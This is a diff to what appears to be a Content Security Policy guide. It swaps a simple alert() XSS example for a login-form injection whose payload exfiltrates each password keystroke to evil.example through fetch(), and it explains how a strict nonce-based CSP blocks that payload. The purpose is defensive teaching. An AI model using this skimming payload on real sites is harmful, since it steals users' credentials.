@@ -12,19 +12,31 @@ In practical terms, CSP is a safety net around your rendering layer: if attacker
 
 # Example of injection
 
-Suppose a page reflects a query parameter directly into the DOM:
+Suppose a page has a login form and reflects a query parameter (say, a pre-filled username) directly into the DOM without encoding it:
 
 ```html
-<div id="message">Welcome, {{ user_input }}</div>
+<p>Signing in as: {{ username }}</p>
+<form>
+  <input type="text"     name="username" value="{{ username }}">
+  <input type="password" name="password">
+  <button type="submit">Log in</button>
+</form>
 ```
 
-If an attacker can supply a value like this:
+If an attacker can get a victim to open a crafted URL, the injected `username` value could be:
 
-```html
-<img src=x onerror="alert('XSS')">
+```
+"><script>
+  document.querySelector('[name=password]')
+    .addEventListener('input', e =>
+      fetch('https://evil.example/log?p=' + encodeURIComponent(e.target.value))
+    );
+</script>
 ```
 
-the browser will execute the inline handler unless the page blocks inline script execution with a strict CSP.
+That closes the `value` attribute and the `<input>` tag, then injects a script that silently exfiltrates every keystroke typed into the password field. The victim sees a normal-looking login page; the attacker receives the password in real time.
+
+A strict CSP (`script-src 'nonce-…' 'strict-dynamic'`) blocks the injected `<script>` from executing entirely — the payload never runs, even though the injection itself succeeded.
 
 # CSP: dropping `'unsafe-inline'` — a practical path to `'strict-dynamic'`
 
